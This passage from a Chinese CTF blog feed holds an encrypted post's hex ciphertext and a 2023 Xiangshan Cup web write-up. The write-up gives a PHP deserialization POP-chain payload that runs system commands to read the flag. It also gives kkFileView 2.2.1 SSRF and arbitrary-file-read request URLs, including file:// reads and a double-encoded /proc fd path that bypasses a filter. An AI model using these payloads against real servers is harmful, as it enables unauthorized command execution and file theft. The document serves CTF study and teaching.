02e01310f86803f9349e9dc01ca095b7fe2652bc74ba791a9234f1e68d851d5644455dbcc6214f9577eee5929bb33ec832cf7b62cbc8a461f03cb95115a81597f6aa9b4e118551e9a5f3c94bf97f8e6550596636913fb69d32c37876c9b5ef2f38445a90a41806c8d3cc3f2bf7e0cfb447e3259a241bb1b6c50165a2b82d4b6ce3a491d9eca0ded760c22a41df8b704f9c41c672420567cbb46709c03b2433fe9b480b9bdb8b0a4bdbf09146405d5acc5e6bd896b640838d64987702631ef5611ca5ca987e0d4a09fd53bf56b65291dd1e6229d171fc5e8afd2c662545b95883fab711ce79f41b6ba3898d6cddfa5b3c8a365c033e22a32fa8e7a58f38ee1abd3b49c9231634cc7dc30af98aba02804e8e1a1c09a6eab70df5f26310c1310965d31a848aa225b24db57860ae9d49383139862eae4b2802450ba4be5e207dea2ae52153839d58cc0e431d332eddb395db09da329f27099fd593e2e03ba6f608a319694dc7c1befb60fada652559853c10c64ad25dac73e5c891ff3cc7d2a91dffe0b6aa4f12110bb00928d4a21ac78a5b74553d710e45dd1e4b62d45b11478efb4975be5b054526b0cdb941f7332826b20053625e0b970d1bbfd8d99f1c220a90fa802b1f71a6cdea1b50a8dbd5c0448aa39849dac1cf2623cd2b2a756b9512b95a1a8b51448680fee79d3bd02af4e9a51e540a44d306308bf5b3d58ec87211e54d7376fb597e387effa9eed76443f327d4f6ccffcb1307a19df729bc795c88ee3f10a8ddfd628d16814134754f15f05b5089d7a80cd02d2f7fad6769d604f0f5a559fe750a6ae872ebbeb493837b8bbafdae5ad9c1e35debc6435333384bf87c417fdcbcdd4a9e8965e902ed189a0fe7619123e2c7f8e075f1a0d4319e87085280717d26d9eb473565e72e65bf4321065925f45ce5139e476a0cd1d920a10c8e0015373bdb018cea73e85e19d457291be4a434c178417ce206d4ba2f6ffa3983608537615680357516a403ff00a1c69dd91523fcbd5d597382133e214209603176b72fa544375a05c7c8fcfd3c685c2f9ccbfd016bf8319cf00b2fff80659b71dd226f3ae93c5ab3fc8bfa6215875fa68a8274afe6c8267a6ef61e6ee8ab45da93a09d1c853dd7bbb1bcf607bf5bc4bb72c58b6361f6d9257d3171db0e973a16779cb32611adda89d307abe3aeef4d7e84418b82c469127437b939572e46aca3c00897b86e11f4038a6d5c017a4c793e41e5f05b76050afd6d6baf8ea62e3222e606007955c1555e684d378acb151d8f5130cefd7543c292d710bf43710d7fa6cdf98d573652a607b70ffa747d3b4360bf9b653fc33eaadb70d5bc61fa4447772452ab86b594ac17b619b131945845a37f94d1ea1ca24d8aab53291f8cb70c829d206c75d48e096938391eb043684f554120c272e0d026223d51c22f4beb488b538823820bd0359a2aa2c430ac2491a7aebbd9c2cf6982a2f4b85f701f75ecf107675d7bdfb6feee25646bbbb7aa4c6d67db10e01f2e5da196c44ae5d0b68eba2b81a08435ab13057a45358f5f269b9abde49a864dd98a3f3e87271740368b9ec3582e157ee6d4a551c7282eccc84e2d33b0753e6242aa457a7965fc4a6f39535d08a7e479af2b57b62acb1b9c85f172f37aecbc1f6467ac7d40afcece3e37e8dc6520748c638f7f8815e0dfd952e23e82732dd7e22b96738496bce5f1d38f17ef4f1bcde19ec36bba5315d9feedd1df9a3313434ef174c92a898b66dc89365f55d479c0754a4f6b064046cfa19f5ba87047a118bdbdfc7e9c0695654d8fc6355b25b49608e49a99526b7edbd5866c0f13db450481038967cb5196469d0fc8e124e67de67d04a53d3ef1ee896e05d103b22d2b71ae792651e816b4ec8fd1267cd8311fa871a8ff259de12c2cd9cfecd50acd56d1e40a9969d537a52814fa7e2bb2df8f0ad3fe0c77cd5a6e1a97bebbb73d395fadff65a3951ce3d45d0e4598451412d16fb299a00421ee79a1c34767ea61d41b2c75940dabd7c9478921ad3133f561569eab09bb090f502f63c65d9b3488860c56e94f9244b91b15b365d26618eabdff491f77b00c55a57886a089934184e27add2b30e480ffb23b94e39fe2d2477d7e371b1739e61688a0ef06a93490d2c09b6bac4cd2ef520bf46064f9c65ad0be792ed2e8ac650fe1a48cd3a4604e67cf5c8b0eb65ff14f296b4c7e63066b4d40d896854ca436e484c515eb8263b9dd5773b57a2853bf1ab290b0805d93a6d1cad8725be8d730bd5c7d3f3ba7227f57e550257afc81b479de8374d89817aae99aef495ef9cc6f436fe7e637115f78748ef8a99ccbfc9a209e5c3c2ad6bc0537ea9c805aeb0b6c6a8183f763399aaa5df4746f110f5fb76347901d5addb5d654ad52209c5fa86d6c370b13c3c7649812f99ca00302bd3256dccaee69c3ccfcc772d1b6dbec4fdea84acdcdb39765e93317dcd497d5418429adfb66f5465df04d8c269752c6edef5b7335ddb5628c9111e319af2dd8609399c1a1bc44423182dc739e2ba52f54bacc54240e11a4bfae0f9e9da9a31c881fe55221222e0a68ea8a840c70b02ea57b600c1749b7bf3001e1a8fff8d5bf4e5141f05417e55697a60873793a80d26847572f96e1d30758347953aeac2613112f4d3ce191b4eee056e72f4157931d3b5178b14bfe50b5050015b4e92e13f90cc1b4d891b59b43f93bfe486cce5478957b01ceffe379fd6418888a9d1cfd1fd4c2c2df42739456125d24993955cb53065fe56781ef9d2364c00eccc5c5e1890f29f462d318cbaafbecf6e040c39e09b633dcd9a222cb522c82c240f227357effc74be25cae77ed787cf7a2229290031fd0d0abde44425a05eaba136cbedcf6e406e6d6bf4a54f5929ea42c4c3fc5727191352eee10c3a13f55515b107dfd14b4fcf10d4d22135d1c81ad5ba9a6593c30a2818fa5cf7ffdf8fcdd9cf6d83a40fcb5ece5a3a1c6f865b03e83c3d10a9ba86a408e746728822a48d8c6ddf53929fb79c1b4da8daf7f7e6a851aa901cdfd83d077d7b5e9945c0b312efb5a3f07829aa7c2299c7a9c3961c9f28671410e8dae24050fe5612ae5d81c844aae95d0271e11929af62c900b805176399006842ad01f9ee359127b8af63c63ce92bf344e6a3c47415870dac3ad65670bf7784be6dfb3b80fdb595f87b6f02faa4ea01cc8b473fc9f3ed8e44b9772a766db9ca2ef868d85c38ec8e405b512a8b511e6fb10a02f085cc8ad902011d07153250f1b5634b1cf9a27ac0e03095535c07879c266713e3c1be364acfe00dd559b24a59c40cdceab9fb2069743a58916714e71f595063dc27fa37a8cf08e06646ac59cb368cc7638ed4fe0982511628ff898f1110c6ff932a920f91974580832010399eeaa77de0984780943a0aeb8e1af3aedbd929eacafc6df5ea2d75b998424cd1fc213327457a4e1893381ba0f2682dce302eed53f74c4e7ed66d24bb08a241d55b29e6d84eaeec1cd17f28a15c03e858b7a70b05746beacffaf073cc71e510d6e263537f0606dcdd489751a8de1d99477df00a31f7135f0dce98e0458e18ffccbba021f8bd21795ba4edceba38825b4fa855a5ad7020d08e911d7eab10d28e4e2dc487a6ff4a1ac6ff4db4d66475ad989e9173c284cf8af1461be0c4445ccf2077bc26e4bd6452b4825ca65c261680051c448f04607b7977d20db874fa8c1800e98071c4b709636610ee29f9c73a78adb2e26630eef83302b7b097f0353f84ba105d4f26b5554fd4911d22aa354ef0dba07e4a3fd77f90bfd9fa4a77d78aef2e439e65e604c76d2734e0e24687f1a51bed6a2395afbe3fba1db161f8d2e75081c3e24e1d3e82c1fdc9e6cd1a367dda326a594d4509a37848cbc05edefd138c2a50c1589760ebf3bdb0f39905eb0a2ddb8e203b214ce9aba5c4c39d8487c47efc0462abbe0ceea4930b4b5be577f272e8d31e382789a14c306fe356a625deb49b4fef8965a99b4314fe3af26de5bce5e95c87452d29ae5f29714ecd96be2a24b7d8873d996813b178c0678bfaa004ef05f0de394997bf5df641d942b71dcbd4a724d1c8732a76fa8d3427c9927a91ad51e7f7d84976ccfe31ffe2005089f2ea198093a8accc801cbb60370598b0ce47668ed0991c75039c5f4b6a2cd8d642f2e8ff8a4211bd4067a32ca97c5dd0e410e39fa755c583c089de8c57fa74553b7fb69a9b4112f63453d3784171a7a1a2867d5ecd0f6374220770c6c8bf08039209e4d819e28d0f8763a192ea665c7627c671384915dd88b43e968723a43eb154b335c679c879994dff91f67d128adb24157404a921f825edc69726fcbf108e1d928b6dbd10a1273a19445dbaa55feb7a96c046c74806396198f43f89345b5a9a9c8a77daa0c015922741b5abb67577765abf73a34cec40e9d03a5a587472315bf2dda636750d54f95eeb92c309abe0293f9bae8755db4f8426649b5e4066a7f3cb7d287211a49e04e4479c2ba940e382c99ce42faee568fc7ed07060894b545f7f03e76fcd9cad98a77d228421ce7da64cd069cbace5aa1257668a666d041c92a410464eaf2843e88c65de10569eb4f2aa89e14e2cee0d0102bb081db5d1ddfbb7185bcb8d32b20c4edc8dd94cfa980946cdc0b8be8a7447eefed945af5e9a213a63748ced277fb5e2f4bd4833462a63c233bb27345fa79745bf690be391c9f6f323de34a3434e93cabe8549d26c33f1a53649ccc96a5ec79e259eb327b34d27ae296ee46c70e34b69636c1924da3241172ca5774a6112f7448d93bce9c120c0dd4114b82353e1a683d3edec305351b3175db82a3930d189834b9b176798e6e774a6386e4e0ede7dd4dcb129eb8fefe0fcf9e2bd7727e867e374a3976b7dc7cbef7bf90f869271871a94a5cd72dcebb5e973c09ece3bb3f6777b8b2da3a12026752374a995f74b0401e1a7b72d61294a3572c359192005dd3a0cb3b4cbc742e82669ceea26291b2d4fd2b0dc4ee13bb744e8c582141771071c1cc1709736a179dd4da732ad9e75b8245e70d54b40ad6385b08e886f94396693d75334d0c07435ef7bb9285192dcf9186a4c4d215c3e6177b946507c78afb2625702e28ca23ee691df60e6545a0e496bdf3948f4ee4369115bd5f31bc6f58950bd5cb29f2aa59dbcbe079328041c0ef3f40066034276b1677b6450c0ecb28d1d411f042ac99536fd3d183db95d690e5e6cf7642683500df40ac0acc56953b4af2782ab627312f457c909239d27507f73f0e5586b1817d78e00801ba335bab4d96e3918f637fd92c0ce8cd1503894664a99739b8eaa06722786041e6d57500c0801e6ce4f4369afebe824b5a8be7f68ed0a6821c66c57c9d158492f528560d3c164768aed7e01b0659f753511400133a449a2d4ba85e57f4c2a29f0abae6ff97314973752b5fef93b1c9b156ee37dde42143e48bc9476e08d7a29bfb5ad6f44b06d33363044e4a96c824bfb5cc3f614e7ac67f21ef7b33408ad1409971956a787113b6cedb6923cdd9380ee0b882c930c9a8d8279346874eb69fc5602e544461321d24e445d33f81d661ad95c0ee524947ccba9945e03746be2f844bba1bcfb8aea7a3037b5b7cee0389b85a7b0011c1480970585394aab22809b36aa937d5e40c4a939fd60730425bd828ce42e61f2006898d3faa047a77811cfcf2eab972f9bcff270cc00455bd4776f3529852b5d1dfc9a5f38a1e740b59a230a86c6b1d34806e5eef6044b00d9ae04e5e5486ec4afab3b9092d9fb4815d6abf2061aafeb120d045cddbb473f7493a94edac922a1273f5a13e905c77bbf26e5ec2d5ff151cc44723eaf6005a84f0088894abc102c37636467e5c0da5a3bb853ec5fdae0bf4340203fadc65aa60e666039356e2f5285852f227aa8f7eaf0c41e68bcb0a2f73d55ffa37899dc3bb9571971dfbb7d88fce771599123abbfadda8f748228879a8138fd3fa00d836fcf283be0df39123a97b66c2c79fa8b66d15faef81b73b4b347a186e4f29071410508299097fee33f430d5fb69e7119ef5f4031024c1175a02f3d1711956b9b25836fbe5ac5cd016c1b6d5a1d93322203096b5b110d92c949d99f52eee14cee949bf606f9912b01624db107d6e23e17e685a1b9aa2ce40bc06aed06b9030cb6d96464bbeba676735c6310f4e31f7f78aecac7c62227785435bbb9d1cda18941c0a83b194d767949c3557ee993d87af8832032aa8f787b75ac5dc339b221e81dd0868efd6d5d44550883114817ba485fa4f2e0a3b306fe0f0f05ce5ecf91bfc37372c48850d9b5e87bf3fa5e352b43a2deffec1995cc13bcace6ac6e10bba0c219c5e60d45591ec4c437359e1a7e2dd6ab19b171ccda5387ec18aef2d3f7a67f564573fbc9e2f6c55dffb81b889847d041f3bff9ad25d19551a71bb1dfe8f758214e6eed4de34287afe5a5134bd2dae63e8a734c779c87ace9a13c3af086d764483d090f703d78669daf01c5d43b6974a65f882f48065cc90ff196506bc4f7e8a341770e1ef8b4c1d0218f4faea097b314bdb4e36079ea935b2568efa38474beaa13fbb6d5650392ef0d7581d02a035cb43afd3e5be69937edb47577aa9c28632634e873610da3c0eda6ff1f486691d0bedc4704bb0c53f15173be921b4e12c75dd4f675dd60eeab4667bb7a11621f5e1ed7365b486be42943f5d51aa5e70563fd79d2b5a62e07aafa4e6fb1fa573e12dc6d8db5ca45ff02c1fb38c431b7bcca9a1cd47152c78aa3eb57204dc3f2b91bf8408494213332f7971a56df24ec94692738868904a9526cc0f1ced1b8f9ceff40ff1cfc91711a81c4de49ef49a93507d7c376c78114046e8ab60e76eef5aec3d72ad0c9e1dcf33aa6b69308aafa20abec85c3d68868cc9d6807ff900a7a263dc36f3cae3b2261a9146bbc3b07ff87d12b056a3b81dd68a0671277713a969f7f7dd15ad9d92d991ee261fda4951480a42a0a266c62cc2841f8e6c88db2c2bfc7725fd53ffe6698fda35c24bcfbbf6030b0fbba938782401577171e6313aa4e71b8ee04f6b721aa77b0cd357db637c945b4098bf6c00d3e65f8817075173e332570121b6d0ccd18f8ea0006c8cdaf6174b5588748e8b0625b91179a324b42960b31ec9d3b50314ec1e0be27c05fecc40bd0fcfef14a09971fc442e371cdb770c7095fdfca59a87e1a999e319e3ba27fc138cd5cbbbcb201a912dbf1eaecbc452ccc4682341f8d95a1a9c86addeda635cc15884954e84909cab1262f1b52c3ca3aad75d07201c1c3c937ec75cd69f1eed97d861b8f5c910b7f776692e3d9f6fbafcd0f8cdd91ffca5c2f72b8cc2c773225be68ee92b56094562c43932458051c2d0675a5d99c445367ca7136cbd03f879448e41683d47162232dc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">本文参考了他人的文章但找不到出处，故加密。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023香山杯</title>
    <link href="/2023/10/22/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/"/>
    <url>/2023/10/22/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="2023香山杯"><a href="#2023香山杯" class="headerlink" title="2023香山杯"></a>2023香山杯</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h2><p>签到题，比较简单的反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;welcome&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;Wh0 4m I?&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;A_G00d_H4ck3r&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">G00d</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$cmd</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;U R A BAD GUY&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H4ck3r</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-title class_">Welcome</span>::<span class="hljs-variable constant_">__destruct</span>   <span class="hljs-variable">$name</span><br><span class="hljs-title class_">H4ck3r</span>::<span class="hljs-variable constant_">__toString</span>  <span class="hljs-variable">$func</span><br><span class="hljs-title class_">G00d</span>::<span class="hljs-variable constant_">__invoke</span> <br></code></pre></td></tr></table></figure><p>这里过滤了flag字符，利用more+正则匹配[0-z]绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;A_G00d_H4ck3r&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">G00d</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;more+/[0-z][0-z][0-z][0-z]&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H4ck3r</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><br><span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$aaa</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">H4ck3r</span>();<br><span class="hljs-variable">$aaa</span>-&gt;name-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">G00d</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="sharedBox"><a href="#sharedBox" class="headerlink" title="sharedBox"></a>sharedBox</h2><p>hint：kkfileview2.2.1 的漏洞利用</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>项目地址：<a href="https://github.com/kekingcn/kkFileView">https://github.com/kekingcn/kkFileView</a></p><p>git下来后回退到2.2.1版本</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243500124.png" alt="img"></p><p>因为我本地是windows，所以还要下载OpenOffice</p><p><a href="https://www.openoffice.org/download/">https://www.openoffice.org/download/</a></p><p>下载安装完根据readme运行FilePreviewApplication的main方法</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349331.png" alt="img"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>访问<code>http://localhost:8012</code></p><p>原题的kkfileview部署在<code>/fileview/</code>下，本地在<code>/</code>，原题用的linux，本地为windows</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349332.png" alt="img"></p><p>存在3个路由</p><p><code>/onlinePreview</code>、<code>picturesPreview</code>、<code>/getCorsFile</code></p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349333.png" alt="img"></p><p>主要漏洞点：</p><p><code>/onlinePreview</code>，在线浏览功能，这里有一个xss和ssrf的漏洞 <code>picturesPreview</code>，图片预览，有xss漏洞 <code>/getCorsFile</code>，任意文件读取和ssrf漏洞</p><p>具体分析：</p><ol><li><code>/onlinePreview</code></li></ol><p>支持file和http协议，而且没有过滤，造成ssrf</p><ol><li><code>/getCorsFile</code>下断点</li></ol><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349334.png" alt="img"></p><p>跟进到<code>getInputStreamFromUrl</code>这里没有过滤传入的字符，造成了任意文件读取</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349335.png" alt="img"></p><p>可以参考：<a href="https://github.com/kekingcn/kkFileView/issues/128">https://github.com/kekingcn/kkFileView/issues/128</a></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>在题目的环境中对<code>getCorsFile</code>进行了限制，直接访问的话会返回 403</p><p>那么就由此有了一个思路：<code>onlinePreview接口ssrf请求到getCorsFile</code>，然后任意文件读取</p><p>即<code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile?urlPath=file:///C:/Windows/win.ini</code></p><p>但是，我们来看看实际效果</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349336.png" alt="img"></p><p>文件类型不支持，那么从源码里看看它为什么不支持，以及支持什么格式的文件</p><p>下个断点</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349337.png" alt="img"></p><p>跟进到这一段，经过<code>getFileNameFromURL</code>处理后得到文件名为<code>getCorsFile</code></p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349338.png" alt="img"></p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/16979524349339.png" alt="img"></p><p>最终传入判断后返回不支持</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493410.png" alt="img"></p><p>那么这也说明了无后缀文件是无法读取的，那看看支持的文件格式</p><p>看到这里，返回有picture、pdf、media等，但是这些肯定不支持文本形式的flag</p><p>然后注意到<code>simText</code>类型</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493411.png" alt="img"></p><p>支持<code>txt</code>、<code>jsp</code>等</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493412.png" alt="img"></p><p>现在引入一个知识点</p><p>spring boot的路径匹配</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493413.png" alt="img"></p><p>而源码中的版本恰好是1.5.8</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493414.png" alt="img"></p><p>那么就有了一个思路：</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile.txt?urlPath=file:///C:/Windows/win.ini</code></p><p>这样就会解析成</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile?urlPath=file:///C:/Windows/win.ini</code></p><p>然后服务端又是怎么处理这个多出来的<code>.txt</code>呢</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493415.png" alt="img"></p><p>可以看到file目录下多了<code>getCorsFile.txt</code>，里面的内容就是要读的文件的内容</p><p>那么这个是怎么实现的呢</p><p>onlinePreview 最后调用了 <code>filePreviewHandle</code>，然后调用了 <code>downLoad</code></p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493416.png" alt="img"></p><p><code>downLoad</code>中利用<code>saveBytesToOutStream</code>将读的内容写入文件</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493417.png" alt="img"></p><p>这里解释了为什么会多一个<code>getCorsFile.txt.txt</code></p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493418.png" alt="img"></p><p>最后就是怎么读取<code>getCorsFile.txt</code></p><p>正常思路</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile.txt</code></p><p>但是刚刚提到spring boot特性会将<code>getCorsFile.txt</code>解析为<code>getCorsFile</code></p><p>所以用<code>%01</code>、<code>%02</code>等不可见字符（猜测是不可见字符，本地测试是可以的）绕过<code>http://localhost:8012/%01getCorsFile.txt</code></p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>综合上述</p><p>将文件写入</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/getCorsFile.txt?urlPath=file:///C:/Windows/win.ini</code></p><p>读文件</p><p><code>http://localhost:8012/onlinePreview?url=http://127.0.0.1:8012/%09getCorsFile.txt</code></p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493419.png" alt="img"></p><p>比赛环境已经关了，赛题的后续利用无法复现了</p><p>最后贴个lxxxin师傅的题解，参考：<a href="https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb">https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb</a></p><blockquote><p>最终Payload如下，题目应该是在nginx或者&#x2F;onlinePreview路由处对proc、fd关键字做了匹配，由于是SSRF，会发起两次http请求，因此可以通过双重URL编码绕过</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/fileview/onlinePreview?url=http://localhost:8012/getCorsFile.jsp?urlPath=file:///%2570%2572%256f%2563/29/%2566%2564/6</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>101.201.35.76:22873<br></code></pre></td></tr></table></figure><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493420.png" alt="img"></p><p>绕过后，读取的文件内容会保存在getCorsFile.jsp中，用%09、%02等字符绕过一下读取文件即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/fileview/%09getCorsFile.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>101.201.35.76:22873<br></code></pre></td></tr></table></figure><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493421.png" 